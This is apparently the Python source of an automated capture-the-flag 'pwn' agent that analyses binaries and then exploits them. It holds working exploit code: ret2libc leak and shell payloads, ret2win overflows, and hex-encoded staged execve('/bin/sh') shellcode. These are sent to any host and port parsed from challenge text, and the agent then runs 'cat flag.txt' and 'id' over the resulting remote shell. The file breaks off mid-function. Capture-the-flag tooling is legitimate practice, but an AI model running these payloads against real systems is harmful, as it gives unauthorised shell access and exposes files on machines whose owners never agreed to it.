"""PWN specialist agent.

Orchestration order for a binary challenge:
  1. checksec — identify mitigations
  2. Ghidra static analysis — functions, strings, imports (skipped if GHIDRA_HOME unset)
  3. angr symbolic execution — auto-find input for win/flag functions (skipped if angr missing)
     3b. Execute binary with payload locally; if no flag, send to remote (connection_info).
  4. ret2win — nm/objdump to find win function, cyclic to find offset, craft + deliver payload
     locally then remotely; tries common offsets when core dump unavailable.
  5. pwntools template — fallback exploitation scaffold + LLM strategy advice
"""
from __future__ import annotations

import logging
import os
import re
import socket
import struct
import subprocess
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from agents.base_agent import BaseAgent, AgentType
from core.decision_engine.llm_reasoner import LLMReasoner
from core.utils.flag_utils import find_first_flag
from core.utils.security import minimal_subprocess_env
from tools.common.elf_utils import is_elf_binary
from tools.pwn.pwntools_wrapper import PwntoolsWrapper

logger = logging.getLogger(__name__)

_PWN_KEYWORDS = frozenset([
    "overflow", "pwn", "exploit", "rop", "ret2libc", "shellcode",
    "buffer", "heap", "use-after-free", "uaf", "format string",
    "stack", "bypass", "binary", "reversing", "reverse",
])

_BINARY_EXTENSIONS = {".elf", ".bin", ".exe", ".out", ".o"}


def _is_binary(path: str) -> bool:
    return any(path.endswith(ext) for ext in _BINARY_EXTENSIONS) or is_elf_binary(path)


class PwnAgent(BaseAgent):
    """
    Specialist agent for advanced binary exploitation and symbolic reversing.

    Capabilities beyond BinaryExploitationAgent:
    - angr symbolic execution to auto-discover inputs for win conditions
    - Ghidra-assisted function discovery to feed angr targeting
    - Graceful degradation when optional tools (angr, Ghidra) are unavailable
    """

    def __init__(
        self,
        agent_id: str = "pwn_agent",
        reasoner: Optional[LLMReasoner] = None,
        pwn_tool: Optional[PwntoolsWrapper] = None,
    ) -> None:
        super().__init__(agent_id, AgentType.SPECIALIST)
        self.reasoner = reasoner
        self.pwn_tool = pwn_tool or PwntoolsWrapper()
        self.capabilities = [
            "symbolic_execution",
            "win_function_discovery",
            "buffer_overflow",
            "rop_chain_generation",
            "shellcode_injection",
            "format_string_exploitation",
            "heap_exploitation",
            "binary_mitigation_analysis",
            "ghidra_static_analysis",
            "kernel_exploitation",
            "race_conditions",
        ]

        # Lazy-loaded optional tools — instantiated on first use so missing
        # deps don't prevent the agent from loading.
        self._angr: Any = None
        self._ghidra: Any = None

    # ------------------------------------------------------------------
    # BaseAgent interface
    # ------------------------------------------------------------------

    def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        description = challenge.get("description", "").lower()
        files = challenge.get("files", [])
        category = challenge.get("category", "").lower()

        has_binary = any(_is_binary(f) for f in files)
        has_keywords = any(kw in description for kw in _PWN_KEYWORDS)
        is_pwn_category = category in {"pwn", "binary", "reversing", "rev"}

        can_handle = has_binary or has_keywords or is_pwn_category
        confidence = 0.9 if can_handle else 0.1

        return {
            "agent_id": self.agent_id,
            "can_handle": can_handle,
            "confidence": confidence,
            "approach": (
                "Static analysis + symbolic execution + exploit generation"
                if can_handle else "None"
            ),
        }

    def solve_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        steps: List[str] = []
        files = challenge.get("files", [])
        binaries = [f for f in files if _is_binary(f)]

        if not binaries:
            conn_info = challenge.get("connection_info")
            if not conn_info:
                return self._result(challenge, "failed", steps,
                                    error="No binary files or connection info found")
            steps.append(f"Remote-only challenge: {conn_info}")
            return self._result(challenge, "attempted", steps)

        binary = binaries[0]
        steps.append(f"Primary binary: {binary}")

        # Phase 1 — mitigations
        steps.extend(self._phase_checksec(binary))

        # Fast path — source-guided executable-stack shellcode challenge.
        shell_steps, flag_str, handled = self._phase_source_guided_shellcode(binary, files, challenge)
        steps.extend(shell_steps)
        if flag_str:
            return self._result(challenge, "solved", steps, flag=flag_str)
        if handled:
            return self._result(challenge, "attempted", steps)

        # Fast path — no PIE + bundled libc + remote target is usually ret2libc.
        ret2libc_steps, flag_str = self._phase_ret2libc(binary, files, challenge)
        steps.extend(ret2libc_steps)
        if flag_str:
            return self._result(challenge, "solved", steps, flag=flag_str)
        if self._ret2libc_attempted(ret2libc_steps):
            steps.append(
                "ret2libc attempted but did not recover a flag; stopping before "
                "slow generic Ghidra/angr/LLM fallbacks."
            )
            return self._result(challenge, "attempted", steps)

        # Phase 2 — Ghidra static analysis
        ghidra_steps, ghidra_functions = self._phase_ghidra(binary)
        steps.extend(ghidra_steps)

        # Phase 3 — angr symbolic execution → payload
        angr_steps, payload = self._phase_angr(binary, ghidra_functions, challenge)
        steps.extend(angr_steps)

        if payload is not None:
            # Phase 3b — run binary with payload locally
            run_steps, flag_str = self._phase_run_with_payload(binary, payload)
            steps.extend(run_steps)
            if flag_str:
                return self._result(challenge, "solved", steps, flag=flag_str)

            # Phase 3c — send angr payload to remote if available
            conn_info = self._extract_connection_info(challenge)
            if conn_info:
                remote_steps, flag_str = self._send_payload_remote(conn_info, payload)
                steps.extend(remote_steps)
                if flag_str:
                    return self._result(challenge, "solved", steps, flag=flag_str)

            return self._result(
                challenge, "attempted", steps,
                artifacts={"angr_payload": payload.hex()},
            )

        # Phase 4 — ret2win: find win function + overflow offset, craft + deliver payload
        ret2win_steps, flag_str = self._phase_ret2win(binary, challenge)
        steps.extend(ret2win_steps)
        if flag_str:
            return self._result(challenge, "solved", steps, flag=flag_str)

        # Phase 5 — pwntools template + LLM fallback
        steps.extend(self._phase_pwntools_fallback(binary, challenge))

        return self._result(challenge, "attempted", steps)

    def get_capabilities(self) -> List[str]:
        return self.capabilities

    # ------------------------------------------------------------------
    # Phase helpers
    # ------------------------------------------------------------------

    def _phase_checksec(self, binary: str) -> List[str]:
        steps: List[str] = []
        steps.append("Running checksec...")
        mitigations = self.pwn_tool.run_checksec(binary)
        if "error" not in mitigations:
            steps.append(f"Mitigations: {mitigations}")
        else:
            steps.append(f"checksec unavailable: {mitigations['error']}")
        return steps

    def _phase_ghidra(self, binary: str) -> tuple[List[str], List[str]]:
        """Returns (steps, list_of_function_names)."""
        steps: List[str] = []
        function_names: List[str] = []

        ghidra = self._load_ghidra()
        if ghidra is None:
            steps.append("Ghidra skipped (GHIDRA_HOME not set or unavailable)")
            return steps, function_names

        steps.append("Running Ghidra headless analysis...")
        try:
            analysis = ghidra.analyze(binary, timeout_s=300)
            function_names = [f.name for f in analysis.functions]
            steps.append(
                f"Ghidra found {len(analysis.functions)} functions, "
                f"{len(analysis.strings)} strings, "
                f"{len(analysis.imports)} imports"
            )
            interesting = [
                n for n in function_names
                if any(kw in n.lower() for kw in ("win", "flag", "shell", "backdoor",
                                                   "success", "correct", "chall"))
            ]
            if interesting:
                steps.append(f"Interesting functions: {interesting}")
        except Exception as exc:
            steps.append(f"Ghidra analysis failed: {exc}")

        return steps, function_names

    def _phase_angr(
        self,
        binary: str,
        ghidra_functions: List[str],
        challenge: Dict[str, Any],
    ) -> tuple[List[str], Optional[bytes]]:
        """Returns (steps, stdin_payload_bytes_or_None)."""
        steps: List[str] = []

        angr_tool = self._load_angr()
        if angr_tool is None:
            steps.append("angr skipped (not installed — run: pip install angr)")
            return steps, None

        steps.append("Scanning binary for win/flag symbols via angr...")
        try:
            hits = angr_tool.find_win_symbols(binary)
        except Exception as exc:
            steps.append(f"Symbol scan failed: {exc}")
            return steps, None

        if not hits:
            # Supplement with any names Ghidra found
            for name in ghidra_functions:
                if any(kw in name.lower() for kw in ("win", "flag", "shell",
                                                      "backdoor", "success")):
                    from tools.pwn.angr_tool import SymbolHit
                    hits.append(SymbolHit(addr=0, name=name))

        if not hits:
            steps.append("No win/flag symbols found — skipping symbolic execution")
            return steps, None

        target = hits[0]
        steps.append(
            f"Targeting symbol '{target.name}' "
            f"(0x{target.addr:x} if resolved)"
        )

        result = (
            angr_tool.find_input(binary, find_addr=target.addr)
            if target.addr
            else angr_tool.find_input_by_symbol(binary, symbol_name=target.name)
        )

        steps.append(
            f"angr exploration completed in {result.duration_s:.1f}s — "
            f"{'found path' if result.found else 'no path found'}"
        )

        if result.found and result.stdin_input is not None:
            payload_preview = result.stdin_input[:80]
            try:
                readable = payload_preview.decode("utf-8", errors="replace")
            except Exception:
                readable = repr(payload_preview)
            steps.append(f"Payload (first 80 bytes): {readable!r}")
            return steps, result.stdin_input

        if result.error:
            steps.append(f"angr error: {result.error}")

        return steps, None

    def _phase_run_with_payload(
        self, binary: str, payload: bytes
    ) -> tuple[List[str], Optional[str]]:
        """
        Execute *binary* with *payload* piped to stdin, scan output for a flag.

        Returns (steps, flag_string_or_None).
        """
        steps: List[str] = []
        steps.append(f"Executing binary with angr payload ({len(payload)} bytes)...")
        try:
            if not os.access(binary, os.X_OK):
                current_mode = os.stat(binary).st_mode
                os.chmod(binary, current_mode | 0o700)
                steps.append("Binary was not executable; added user execute permission.")

            proc = subprocess.run(
                [binary],
                input=payload,
                capture_output=True,
                env=minimal_subprocess_env(),
                timeout=10,
            )
            output = (proc.stdout + proc.stderr).decode("utf-8", errors="replace")
            preview = output[:200].replace("\n", " ")
            steps.append(f"Binary output: {preview!r}")

            flag = find_first_flag(output)
            if flag:
                steps.append(f"Flag confirmed: {flag}")
                return steps, flag

            steps.append("No flag pattern found in binary output")

        except FileNotFoundError:
            steps.append(f"Binary not found or not executable: {binary}")
        except PermissionError:
            steps.append(f"Permission denied running binary: {binary}")
        except subprocess.TimeoutExpired:
            steps.append("Binary execution timed out (10s)")
        except Exception as exc:
            steps.append(f"Binary execution error: {exc}")

        return steps, None

    def _phase_pwntools_fallback(
        self, binary: str, challenge: Dict[str, Any]
    ) -> List[str]:
        steps: List[str] = []
        conn_info = self._extract_connection_info(challenge)
        self.pwn_tool.generate_template(binary, conn_info)
        steps.append("Generated pwntools exploit template")

        if os.getenv("CTF_AGENTS_ENABLE_PWN_LLM_FALLBACK") != "1":
            steps.append("Skipping pwn LLM fallback by default; set CTF_AGENTS_ENABLE_PWN_LLM_FALLBACK=1 to enable.")
            return steps

        if self.reasoner is None:
            self.reasoner = LLMReasoner()

        if getattr(self.reasoner, "is_available", False):
            steps.append("Requesting exploit strategy from LLM...")
            prompt = (
                f"Provide a brief exploit strategy for this binary challenge.\n"
                f"Binary: {binary}\n"
                f"Description: {challenge.get('description', 'N/A')}\n"
                f"Connection info: {conn_info or 'local only'}"
            )
            try:
                advice = self.reasoner._call_llm(prompt)
                steps.append(f"LLM strategy: {advice}")
            except Exception as exc:
                steps.append(f"LLM unavailable: {exc}")

        return steps

    # ------------------------------------------------------------------
    # ret2libc helpers
    # ------------------------------------------------------------------

    def _phase_ret2libc(
        self,
        binary: str,
        files: List[str],
        challenge: Dict[str, Any],
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        conn_info = self._extract_connection_info(challenge)
        libc_path = self._find_libc_file(files, binary)

        if not conn_info or not libc_path:
            return steps, None

        steps.append("Attempting ret2libc exploitation with bundled libc...")
        if self._is_pie(binary):
            steps.append("ret2libc: PIE enabled — static PLT/GOT gadgets unreliable; skipping")
            return steps, None

        context = self._build_ret2libc_context(binary, libc_path, steps)
        if context is None:
            return steps, None

        offsets = self._candidate_overflow_offsets(binary, steps)
        for offset in offsets:
            ret_steps, flag = self._try_ret2libc_at_offset(conn_info, offset, context)
            steps.extend(ret_steps)
            if flag:
                return steps, flag

        return steps, None

    @staticmethod
    def _ret2libc_attempted(steps: List[str]) -> bool:
        return any(step.startswith("ret2libc: trying remote leak") for step in steps)

    @staticmethod
    def _find_libc_file(files: List[str], binary: str) -> Optional[str]:
        candidates = [str(path) for path in files]
        binary_dir = os.path.dirname(os.path.abspath(binary))
        candidates.extend([
            os.path.join(binary_dir, "libc.so.6"),
            os.path.join(binary_dir, "libc.so"),
        ])

        for path in candidates:
            name = os.path.basename(path).lower()
            if name.startswith("libc") and os.path.exists(path):
                return path
        return None

    def _build_ret2libc_context(
        self,
        binary: str,
        libc_path: str,
        steps: List[str],
    ) -> Optional[Dict[str, int]]:
        try:
            import pwn  # type: ignore
            pwn.context.clear(arch="amd64", os="linux")
            pwn.context.log_level = "error"
            elf = pwn.ELF(binary, checksec=False)
            libc = pwn.ELF(libc_path, checksec=False)
        except Exception as exc:
            steps.append(f"ret2libc: pwntools ELF analysis unavailable: {exc}")
            return None

        try:
            rop = pwn.ROP(elf)
            pop_rdi = int(rop.find_gadget(["pop rdi", "ret"]).address)
        except Exception:
            pop_rdi = self._find_pop_rdi_gadget(binary) or 0

        ret_gadget = self._find_ret_gadget(binary) or 0
        puts_plt = int((elf.plt or {}).get("puts") or 0)
        puts_got = int((elf.got or {}).get("puts") or 0)
        main_addr = int((elf.symbols or {}).get("main") or 0)
        libc_puts = int((libc.symbols or {}).get("puts") or 0)
        libc_system = int((libc.symbols or {}).get("system") or 0)
        try:
            libc_binsh = int(next(libc.search(b"/bin/sh")))
        except Exception:
            libc_binsh = 0

        missing = [
            name
            for name, value in {
                "pop rdi; ret": pop_rdi,
                "puts@plt": puts_plt,
                "puts@got": puts_got,
                "main": main_addr,
                "libc puts": libc_puts,
                "libc system": libc_system,
                "libc /bin/sh": libc_binsh,
            }.items()
            if not value
        ]
        if missing:
            steps.append(f"ret2libc: missing required symbol/gadget(s): {', '.join(missing)}")
            return None

        steps.append(
            "ret2libc: resolved puts@plt, puts@got, main, pop rdi gadget, "
            "system, and /bin/sh."
        )
        return {
            "pop_rdi": pop_rdi,
            "ret": ret_gadget,
            "puts_plt": puts_plt,
            "puts_got": puts_got,
            "main": main_addr,
            "libc_puts": libc_puts,
            "libc_system": libc_system,
            "libc_binsh": libc_binsh,
        }

    def _candidate_overflow_offsets(self, binary: str, steps: List[str]) -> List[int]:
        detected = self._find_overflow_offset(binary, steps)
        candidates = [40, 56, 72, 88, 104, 120, 136, 152, 168, 200, 256]
        if detected is not None:
            candidates.insert(0, detected)

        out: List[int] = []
        for value in candidates:
            if value not in out:
                out.append(value)
        return out

    def _try_ret2libc_at_offset(
        self,
        conn_info: str,
        offset: int,
        context: Dict[str, int],
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        parsed = self._parse_host_port(conn_info)
        if parsed is None:
            steps.append(f"ret2libc: could not parse connection_info: {conn_info!r}")
            return steps, None
        host, port = parsed

        steps.append(f"ret2libc: trying remote leak with offset={offset} against {host}:{port}")
        try:
            import pwn  # type: ignore
            pwn.context.clear(arch="amd64", os="linux")
            pwn.context.log_level = "error"
            io = pwn.remote(host, port, timeout=8)
        except ImportError:
            steps.append("ret2libc: pwntools not installed; cannot connect to remote")
            return steps, None
        except Exception as exc:
            steps.append(f"ret2libc: remote connection failed: {exc}")
            return steps, None

        try:
            leak_payload = self._ret2libc_leak_payload(offset, context)
            self._send_menu_or_raw_payload(io, leak_payload)
            leak_output = io.recvuntil(b"Welcome", timeout=4)
            leaked_puts = self._parse_ret2libc_leak(leak_output, context["pop_rdi"])
            if not leaked_puts:
                steps.append("ret2libc: could not parse puts leak from remote output")
                io.close()
                return steps, None

            libc_base = leaked_puts - context["libc_puts"]
            steps.append(f"ret2libc: leaked puts=0x{leaked_puts:x}; libc base=0x{libc_base:x}")

            system = libc_base + context["libc_system"]
            binsh = libc_base + context["libc_binsh"]
            shell_payload = self._ret2libc_shell_payload(offset, context, system, binsh)
            self._send_menu_or_raw_payload(io, shell_payload)
            time.sleep(0.25)

            output = b""
            for command in (b"cat flag.txt", b"cat /flag.txt", b"cat flag", b"id"):
                io.sendline(command)
                time.sleep(0.25)
                try:
                    output += io.recvrepeat(timeout=1)
                except Exception:
                    pass
                flag = find_first_flag(output.decode("utf-8", errors="replace"))
                if flag:
                    preview = output[:300].decode("utf-8", errors="replace").replace("\n", " ")
                    steps.append(f"ret2libc: shell output: {preview!r}")
                    steps.append(f"Flag found via ret2libc: {flag}")
                    return steps, flag

            preview = output[:300].decode("utf-8", errors="replace").replace("\n", " ")
            steps.append(f"ret2libc: no flag in shell output: {preview!r}")
        except Exception as exc:
            steps.append(f"ret2libc: exploit failed at offset {offset}: {exc}")
        finally:
            try:
                io.close()
            except Exception:
                pass

        return steps, None

    @staticmethod
    def _ret2libc_leak_payload(offset: int, context: Dict[str, int]) -> bytes:
        return (
            b"A" * offset
            + struct.pack("<Q", context["pop_rdi"])
            + struct.pack("<Q", context["puts_got"])
            + struct.pack("<Q", context["puts_plt"])
            + struct.pack("<Q", context["main"])
        )

    @staticmethod
    def _ret2libc_shell_payload(
        offset: int,
        context: Dict[str, int],
        system: int,
        binsh: int,
    ) -> bytes:
        payload = b"A" * offset
        if context.get("ret"):
            payload += struct.pack("<Q", context["ret"])
        payload += (
            struct.pack("<Q", context["pop_rdi"])
            + struct.pack("<Q", binsh)
            + struct.pack("<Q", system)
        )
        return payload

    @staticmethod
    def _parse_ret2libc_leak(output: bytes, pop_rdi: int) -> Optional[int]:
        marker = struct.pack("<Q", pop_rdi).rstrip(b"\x00")
        for line in output.splitlines():
            if b"Enjoy your " not in line:
                continue
            leak_line = line.split(b"Enjoy your ", 1)[1]
            if marker and marker in leak_line:
                leak_line = leak_line.split(marker, 1)[1]
            leak = leak_line[-6:]
            if len(leak) >= 4:
                value = struct.unpack("<Q", leak.ljust(8, b"\x00"))[0]
                if value > 0x100000000000:
                    return value
        return None

    @staticmethod
    def _send_menu_or_raw_payload(io: Any, payload: bytes) -> None:
        transcript = b""
        try:
            transcript += io.recvrepeat(timeout=0.5)
        except Exception:
            pass

        if any(token in transcript for token in (b"Fill my dish", b"Drink something", b"What would you like")):
            io.sendline(b"1")
            try:
                io.recvuntil(b">", timeout=2)
            except Exception:
                pass

        io.sendline(payload)

    def _find_pop_rdi_gadget(self, binary: str) -> Optional[int]:
        try:
            r = subprocess.run(
                ["ROPgadget", "--binary", binary, "--only", "pop|ret"],
                capture_output=True, text=True, timeout=15,
            )
            for line in r.stdout.splitlines():
                if " : pop rdi ; ret" in line:
                    addr_str = line.split(" : ")[0].strip()
                    return int(addr_str, 16)
        except Exception:
            pass
        return None

    def _phase_source_guided_shellcode(
        self,
        binary: str,
        files: List[str],
        challenge: Dict[str, Any],
    ) -> tuple[List[str], Optional[str], bool]:
        steps: List[str] = []
        source_path = self._find_source_file(files)
        conn_info = self._extract_connection_info(challenge)

        if not source_path:
            return steps, None, False

        try:
            source = open(source_path, encoding="utf-8", errors="ignore").read()
        except Exception as exc:
            steps.append(f"Source-guided shellcode skipped; could not read {source_path}: {exc}")
            return steps, None, False

        if not self._looks_like_execute_buffer_challenge(source):
            return steps, None, False

        steps.append("Detected source-guided executable-stack shellcode pattern.")
        blacklist = self._extract_blacklist_bytes(source)
        if blacklist:
            steps.append(f"Extracted blacklist with {len(blacklist)} byte(s).")

        stage1 = self._build_badbyte_safe_read_stage(blacklist)
        stage2 = self._execve_bin_sh_shellcode()
        if stage1 is None:
            steps.append("Could not build a first-stage payload that avoids the blacklist.")
            return steps, None, True

        if not conn_info:
            steps.append("Source-guided shellcode needs a remote host:port; none found in challenge metadata or description.")
            return steps, None, True

        remote_steps, flag = self._send_staged_shell_remote(
            conn_info,
            stage1,
            stage2,
            commands=[
                b"cat flag.txt\n",
                b"cat /flag.txt\n",
                b"cat flag\n",
            ],
        )
        steps.extend(remote_steps)
        return steps, flag, True

    @staticmethod
    def _find_source_file(files: List[str]) -> Optional[str]:
        for path in files:
            if str(path).lower().endswith((".c", ".cc", ".cpp")) and os.path.exists(path):
                return str(path)
        return None

    @staticmethod
    def _looks_like_execute_buffer_challenge(source: str) -> bool:
        compact = re.sub(r"\s+", " ", source)
        return (
            "read(0" in compact
            and "blacklist" in compact.lower()
            and re.search(r"\(\s*\(\s*void\s*\(\s*\*\s*\)\s*\(\s*\)\s*\)\s*\w+\s*\)\s*\(\s*\)", compact)
            is not None
        )

    @staticmethod
    def _extract_blacklist_bytes(source: str) -> bytes:
        match = re.search(r"blacklist\s*\[[^\]]*\]\s*=\s*\"((?:\\.|[^\"\\])*)\"", source, re.S)
        if not match:
            return b""

        raw = match.group(1)
        out = bytearray()
        i = 0
        while i < len(raw):
            ch = raw[i]
            if ch != "\\":
                out.append(ord(ch) & 0xff)
                i += 1
                continue
            if i + 1 >= len(raw):
                break
            nxt = raw[i + 1]
            if nxt == "x" and i + 3 < len(raw):
                try:
                    out.append(int(raw[i + 2:i + 4], 16))
                    i += 4
                    continue
                except ValueError:
                    pass
            escapes = {"n": 0x0a, "r": 0x0d, "t": 0x09, "0": 0x00, "\\": 0x5c, '"': 0x22}
            out.append(escapes.get(nxt, ord(nxt) & 0xff))
            i += 2
        return bytes(out)

    @staticmethod
    def _build_badbyte_safe_read_stage(blacklist: bytes) -> Optional[bytes]:
        # At the vulnerable call site for this challenge family, rdx points at
        # the input buffer and rax is already 0. Read stage two into buf+0x10 so
        # the read syscall does not overwrite the jmp instruction before it runs.
        stage = bytes.fromhex("31ff488d72106a7f5a0f05ffe6")
        bad = set(blacklist)
        if any(byte in bad for byte in stage):
            return None
        return stage

    @staticmethod
    def _execve_bin_sh_shellcode() -> bytes:
        return bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")

    def _send_staged_shell_remote(
        self,
        conn_info: str,
        stage1: bytes,
        stage2: bytes,
        *,
        commands: List[bytes],
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        parsed = self._parse_host_port(conn_info)
        if parsed is None:
            steps.append(f"Could not parse connection_info: {conn_info!r}")
            return steps, None
        host, port = parsed
        steps.append(f"Sending staged shellcode exploit to remote {host}:{port}...")

        try:
            with socket.create_connection((host, port), timeout=10) as sock:
                sock.settimeout(2)
                try:
                    banner = sock.recv(4096).decode("utf-8", errors="replace")
                    if banner.strip():
                        steps.append(f"Remote banner: {banner[:200]!r}")
                except socket.timeout:
                    pass

                sock.sendall(stage1)
                time.sleep(0.15)
                sock.sendall(stage2)
                time.sleep(0.25)

                output = ""
                for command in commands:
                    sock.sendall(command)
                    time.sleep(0.25)
                    try:
                        chunk = sock.recv(4096).decode("utf-8", errors="replace")
                    except socket.timeout:
                        chunk = ""
                    output += chunk
                    flag = find_first_flag(output)
                    if flag:
                        preview = output[:300].replace("\n", " ")
                        steps.append(f"Staged shell output: {preview!r}")
                        steps.append(f"Flag found via staged shellcode: {flag}")
                        return steps, flag

                preview = output[:300].replace("\n", " ")
                steps.append(f"Staged shell output: {preview!r}")
        except Exception as exc:
            steps.append(f"Staged shellcode exploit failed: {exc}")

        return steps, None

    # ------------------------------------------------------------------
    # ret2win helpers
    # ------------------------------------------------------------------

    def _phase_ret2win(
        self, binary: str, challenge: Dict[str, Any]
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        steps.append("Attempting ret2win exploitation...")

        if self._is_pie(binary):
            steps.append("ret2win: PIE enabled — static addresses unreliable; skipping")
            return steps, None

        win_addr = self._find_win_addr(binary, steps)
        if win_addr is None:
            steps.append("ret2win: no win-like function found")
            return steps, None

        conn_info = self._extract_connection_info(challenge)
        offset = self._find_overflow_offset(binary, steps)

        if offset is not None:
            ret_steps, flag = self._try_ret2win_at_offset(binary, offset, win_addr, conn_info)
            steps.extend(ret_steps)
            return steps, flag

        steps.append("Core dump unavailable; trying common offsets")
        for candidate in [40, 56, 72, 88, 104, 120, 136, 152, 168, 200, 256]:
            ret_steps, flag = self._try_ret2win_at_offset(binary, candidate, win_addr, conn_info)
            steps.extend(ret_steps)
            if flag:
                return steps, flag

        return steps, None

    def _try_ret2win_at_offset(
        self,
        binary: str,
        offset: int,
        win_addr: int,
        conn_info: Optional[str],
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        ret_gadget = self._find_ret_gadget(binary)

        # On x86-64 some functions need 16-byte stack alignment; try both orderings.
        base = b"A" * offset
        payloads: List[tuple[str, bytes]] = []
        if ret_gadget:
            payloads.append((
                f"offset={offset} + ret(0x{ret_gadget:x}) + win",
                base + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr),
            ))
        payloads.append((
            f"offset={offset} + win",
            base + struct.pack("<Q", win_addr),
        ))

        for desc, payload in payloads:
            steps.append(f"Trying ret2win: {desc}")
            run_steps, flag = self._phase_run_with_payload(binary, payload)
            steps.extend(run_steps)
            if flag:
                return steps, flag

            if conn_info:
                remote_steps, flag = self._send_payload_remote(conn_info, payload)
                steps.extend(remote_steps)
                if flag:
                    return steps, flag

        return steps, None

    def _find_win_addr(self, binary: str, steps: List[str]) -> Optional[int]:
        WIN_KEYWORDS = ("win", "flag", "shell", "backdoor", "success", "correct")
        for cmd in (
            ["nm", "-n", "--defined-only", binary],
            ["objdump", "-t", binary],
        ):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if r.returncode != 0:
                    continue
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) < 2:
                        continue
                    name = parts[-1]
                    addr_str = parts[0]
                    if any(kw in name.lower() for kw in WIN_KEYWORDS):
                        try:
                            addr = int(addr_str, 16)
                            if addr > 0:
                                steps.append(f"ret2win: found '{name}' @ 0x{addr:x}")
                                return addr
                        except ValueError:
                            continue
            except Exception as exc:
                logger.debug("Symbol lookup (%s) failed: %s", cmd[0], exc)
        return None

    def _find_overflow_offset(self, binary: str, steps: List[str]) -> Optional[int]:
        try:
            import pwn  # type: ignore
            pwn.context.log_level = "error"
        except ImportError:
            steps.append("pwntools not installed; falling back to common offsets")
            return None

        try:
            r = subprocess.run(["file", binary], capture_output=True, text=True)
            pwn.context.arch = "i386" if "32-bit" in r.stdout else "amd64"
        except Exception:
            pwn.context.arch = "amd64"

        try:
            import resource
            resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        except Exception:
            pass

        try:
            p = pwn.process(binary, env=minimal_subprocess_env())
            p.sendline(pwn.cyclic(300))
            p.wait()
            try:
                core = p.corefile
                if core is None:
                    raise ValueError("no core dump")
                fault = core.fault_addr
                offset = pwn.cyclic_find(fault)
                if offset >= 0:
                    steps.append(f"Overflow offset = {offset} (core dump, fault @ 0x{fault:x})")
                    return offset
            except Exception as core_exc:
                logger.debug("Core dump analysis: %s", core_exc)
        except Exception as exc:
            logger.debug("Overflow offset detection: %s", exc)

        return None

    def _find_ret_gadget(self, binary: str) -> Optional[int]:
        """Return the address of a bare 'ret' gadget for x86-64 stack alignment."""
        try:
            r = subprocess.run(
                ["ROPgadget", "--binary", binary, "--only", "ret"],
                capture_output=True, text=True, timeout=15,
            )
            for line in r.stdout.splitlines():
                if " : ret" == line[line.find(" : "):].rstrip():
                    addr_str = line.split(" : ")[0].strip()
                    try:
                        return int(addr_str, 16)
                    except ValueError:
                        continue
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

        try:
            r = subprocess.run(
                ["objdump", "-d", binary], capture_output=True, text=True, timeout=15
            )
            for line in r.stdout.splitlines():
                m = re.match(r"\s+([0-9a-f]+):\s+c3\s+ret\b", line)
                if m:
                    return int(m.group(1), 16)
        except Exception:
            pass

        return None

    def _is_pie(self, binary: str) -> bool:
        try:
            r = subprocess.run(
                ["readelf", "-h", binary], capture_output=True, text=True, timeout=5
            )
            for line in r.stdout.splitlines():
                if "Type:" in line:
                    return "DYN" in line
        except Exception:
            pass
        return False

    def _send_payload_remote(
        self, conn_info: str, payload: bytes
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        parsed = self._parse_host_port(conn_info)
        if parsed is None:
            steps.append(f"Could not parse connection_info: {conn_info!r}")
            return steps, None
        host, port = parsed

        steps.append(f"Sending payload to remote {host}:{port}...")

        try:
            import pwn  # type: ignore
            pwn.context.log_level = "error"
            io = pwn.remote(host, port, timeout=10)

            try:
                banner = io.recvrepeat(timeout=2).decode("utf-8", errors="replace")
                if banner.strip():
                    steps.append(f"Remote banner: {banner[:200]!r}")
            except Exception:
                pass

            io.sendline(payload)

            try:
                output = io.recvall(timeout=5).decode("utf-8", errors="replace")
            except Exception:
                output = ""
            io.close()

            preview = output[:300].replace("\n", " ")
            steps.append(f"Remote output: {preview!r}")

            flag = find_first_flag(output)
            if flag:
                steps.append(f"Flag found via remote: {flag}")
            return steps, flag

        except ImportError:
            steps.append("pwntools not installed; cannot send to remote")
        except Exception as exc:
            steps.append(f"Remote delivery failed: {exc}")

        return steps, None

    def _extract_connection_info(self, challenge: Dict[str, Any]) -> Optional[str]:
        for key in ("connection_info", "remote", "target"):
            value = challenge.get(key)
            if isinstance(value, str):
                parsed = self._parse_host_port(value)
                if parsed:
                    return f"{parsed[0]}:{parsed[1]}"
            elif isinstance(value, dict):
                host = value.get("host") or value.get("ip")
                port = value.get("port")
                if host and port:
                    return f"{host}:{port}"
                for sub_value in value.values():
                    if isinstance(sub_value, str):
                        parsed = self._parse_host_port(sub_value)
                        if parsed:
                            return f"{parsed[0]}:{parsed[1]}"

        for key in ("url", "rpc_url", "flag_url"):
            value = challenge.get(key)
            if isinstance(value, str):
                parsed = self._parse_host_port(value)
                if parsed:
                    return f"{parsed[0]}:{parsed[1]}"

        text = " ".join([
            str(challenge.get("name", "")),
            str(challenge.get("description", "")),
        ])
        match = re.search(r"\b((?:\d{1,3}\.){3}\d{1,3}|[A-Za-z0-9_.-]+)\s*:\s*(\d{2,5})\b", text)
        if match:
            return f"{match.group(1)}:{int(match.group(2))}"
        return None

    @staticmethod
    def _parse_host_port(value: str) -> Optional[tuple[str, int]]:
        value = str(value).strip()
        parsed = urlparse(value if re.match(r"^\w+://", value) else f"tcp://{value}")
        if parsed.hostname and parsed.port:
            return parsed.hostname, int(parsed.port)
        return None

    # ------------------------------------------------------------------
    # Lazy loaders
    # ------------------------------------------------------------------

    def _load_angr(self) -> Any:
        if self._angr is not None:
            return self._angr
        try:
            from tools.pwn.angr_tool import AngrTool
            self._angr = AngrTool()
        except ImportError:
            self._angr = None
        return self._angr

    def _load_ghidra(self) -> Any:
        if self._ghidra is not None:
            return self._ghidra
        import os
